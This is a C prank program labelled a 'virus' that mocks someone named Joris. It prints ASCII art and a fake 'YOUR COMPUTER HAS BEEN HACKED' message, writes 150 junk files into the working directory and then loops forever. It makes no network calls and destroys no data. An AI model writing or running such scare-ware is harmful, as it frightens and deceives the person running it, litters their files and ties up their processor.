/* JORIS LE CON OFFICIAL VIRUS DO NOT STEAL THE CODE */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char joris_str[] = "                                                                                                   \n"
"                                                                                                    \n"
"                                  ,**//*//******,.                                                  \n"
"                            **/((((####(///*******,,,,                                              \n"
"                         ***///(/(#&@@@&(*********,,,,                                              \n"
"                        *//////((%@@@@@@(/*********,,,.                                             \n"
"                       ****///(#%%@@@@@#//***********,,                                             \n"
"                      .****////*      *******((/*,                                                  \n"
"                      ,***,       ,,,,,,.,***/@(,                                                   \n"
"                      ,**,   *****,,,,,,,,*,***.         .                                          \n"
"                      ,**. *****,  ..,,,,,***,                                                      \n"
"                       **,**,..,        ,**(*,                                                      \n"
"                        ****,,****,  .,,***//*,   .,,,                                              \n"
"                    ,,********,,,   .,****//***,   .,,*,,,                                          \n"
"                    ,,(****//*/@@%(/(/****//(/**,     ,,,,,,.                                       \n"
"                     /#(***(#&@@@%/,,*****/(@/*,,       ,,,,                                        \n"
"                      ,#/*//(#//*,,*//*,,  ,*,.           .                                         \n"
"                       */*****,,.,*******,*,,                                                       \n"
"                       &&&/*,,*,,..,,,******,,,,,                                                   \n"
"                       #.  *****,,,    ,*,*/(.,* .                                                  \n"
"                       *(  ********/*   * (@@#/*                                                    \n"
"                            #/**/**///** .,,,                                                       \n"
"                              @/*/#**//****,,,,,,,.                                                 \n"
"                              @@%/((******,,,.                       ,,((#@&/                       \n"
"                     .@@@  . %. @&(//(/***,,,                                                       ";

int main(int argc, char** argv)
{
    printf("%s\n\nYOUR COMPUTER HAS BEEN HACKED BY JORIS LE CON\n\n", joris_str);
    printf("THERE IS NO ESCAPE. YOU ARE DOOMED.\n");
    for (int i = 0; i < 150; ++i)
    {
        char temp[8192];
        strcpy(temp, "YOU_HAVE_BEEN_HACKED_BY_JORIS_LE_CON_");
        char num[16];
        sprintf(num, "%d", i);
        strcat(temp, num);
        FILE* file = fopen(temp, "w");
        fputs(joris_str, file);
        fclose(file);
    }
    while(1);
    return 0;
}
